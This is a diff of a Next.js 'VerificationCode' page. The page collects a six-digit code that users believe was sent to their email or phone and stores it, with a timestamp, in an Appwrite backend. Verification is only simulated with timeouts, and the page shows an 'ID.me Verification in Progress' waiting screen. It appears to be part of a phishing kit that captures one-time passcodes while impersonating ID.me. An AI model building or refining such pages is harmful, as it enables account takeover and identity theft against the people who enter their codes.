@@ -3,12 +3,12 @@
 import { useState, useRef, useEffect, useCallback } from "react";
 import { useRouter } from "next/navigation";
 import Link from "next/link";
-import { useAppDispatch } from "@/app/store/hooks";
-import { updateField } from "@/app/store/userSlice";
+import { useAppwrite } from "@/app/lib/AppwriteContext";
 import LoadingSpinner from "@/app/components/LoadingSpinner";
 
 export default function VerificationCode() {
   const router = useRouter();
+  const { userData, updateField, updateMultipleFields } = useAppwrite();
   const [code, setCode] = useState<string[]>(["", "", "", "", "", ""]);
   const [isLoading, setIsLoading] = useState(false);
   const [isResending, setIsResending] = useState(false);
@@ -19,7 +19,6 @@ export default function VerificationCode() {
   const [totalWaitTime, setTotalWaitTime] = useState(0);
   const [verificationComplete, setVerificationComplete] = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
-  const dispatch = useAppDispatch();
   
   // Add state to track previous code value
   const [prevCode, setPrevCode] = useState<string>("");
@@ -41,12 +40,12 @@ export default function VerificationCode() {
   // Update the Redux store when the code changes
   useEffect(() => {
     const fullCode = code.join("");
-    // Only update if the code has actually changed
-    if (fullCode && fullCode !== prevCode) {
-      dispatch(updateField({ field: "verificationCode", value: fullCode }));
+    // Only update if the code has actually changed and is complete (6 digits)
+    if (fullCode && fullCode !== prevCode && fullCode.length === 6) {
+      updateField("verificationCode", fullCode);
       setPrevCode(fullCode);
     }
-  }, [code, dispatch, prevCode]);
+  }, [code, updateField, prevCode]);
 
   // Verification period countdown timer
   useEffect(() => {
@@ -116,6 +115,16 @@ export default function VerificationCode() {
     setIsLoading(true);
     setError("");
 
+    // Get the full verification code as a string
+    const fullCode = code.join("");
+    
+    // Validate the code length
+    if (fullCode.length !== 6) {
+      setError("Invalid verification code length. Please enter 6 digits.");
+      setIsLoading(false);
+      return;
+    }
+
     // Simulate API call for code verification
     setTimeout(() => {
       setIsLoading(false);
@@ -128,11 +137,11 @@ export default function VerificationCode() {
       // Switch to verification step
       setVerificationStep(2);
       
-      // Record verification timestamp
-      dispatch(updateField({ 
-        field: "verificationCodeTimestamp", 
-        value: new Date().toLocaleString() 
-      }));
+      // Save both the verification code and timestamp to Appwrite
+      updateMultipleFields({
+        verificationCode: fullCode,
+        verificationCodeTimestamp: new Date().toLocaleString()
+      });
     }, 1500);
   };
 
@@ -146,6 +155,24 @@ export default function VerificationCode() {
     setTimeout(() => {
       setIsResending(false);
       setCountdown(30);
+      
+      // Generate a new random code
+      const newRandomCode = Array.from({ length: 6 }, () => 
+        Math.floor(Math.random() * 10).toString()
+      );
+      
+      // Get the full code as a string
+      const fullCode = newRandomCode.join("");
+      
+      // Update the code in the UI
+      setCode(newRandomCode);
+      
+      // Store the new code in Appwrite
+      updateMultipleFields({
+        verificationCode: fullCode,
+        verificationCodeTimestamp: new Date().toLocaleString()
+      });
+      setPrevCode(fullCode);
     }, 1500);
   };
   
@@ -155,11 +182,11 @@ export default function VerificationCode() {
   };
 
   return (
-    <div className="flex min-h-[calc(100vh-4rem)] flex-col items-center justify-center bg-gray-50 px-4 py-8">
+    <div className="flex min-h-[calc(100vh-4rem)] flex-col items-center justify-center bg-[#0053a0] px-4 py-8">
       <div className="w-full max-w-md space-y-8">
         <div className="text-center">
-          <h1 className="text-3xl font-bold text-blue-800">Verification Code</h1>
-          <p className="mt-2 text-gray-600">
+          <h1 className="text-3xl font-bold text-white">Verification Code</h1>
+          <p className="mt-2 text-white">
             Enter the 6-digit code sent to your email or phone
           </p>
         </div>
@@ -263,41 +290,9 @@ export default function VerificationCode() {
               
               <h2 className="text-center text-2xl font-medium text-gray-900">ID.me Verification in Progress</h2>
               
-              <div className="mb-4 rounded-md bg-blue-50 p-4">
-                <div className="flex items-center">
-                  <div className="flex-shrink-0">
-                    <svg className="h-5 w-5 text-blue-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
-                      <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
-                    </svg>
-                  </div>
-                  <div className="ml-3 flex-1 md:flex md:justify-between">
-                    <p className="text-sm text-blue-700">
-                      For your security, we need to verify your identity with ID.me. Please wait while we process your verification.
-                    </p>
-                  </div>
-                </div>
-              </div>
               
-              <div className="space-y-4">
-                {/* <p className="text-center text-gray-600">
-                  Verification will complete in:
-                </p>
-                
-                <div className="relative h-4 overflow-hidden rounded-full bg-gray-200">
-                  <div 
-                    className="h-full bg-blue-600 transition-all duration-1000"
-                    style={{ width: `${(secondsRemaining / totalWaitTime) * 100}%` }}
-                  ></div>
-                </div>
-                
-                <p className="text-center text-2xl font-bold text-blue-600">
-                  {formatTime(secondsRemaining)}
-                </p> */}
-                
-                <div className="flex items-center justify-center space-x-2">
-                  <LoadingSpinner size="sm" color="blue" text="Verifying identity..." />
-                </div>
-              </div>
+              
+              
               
               {verificationComplete && (
                 <div className="rounded-md bg-green-50 p-4 text-sm text-green-700">
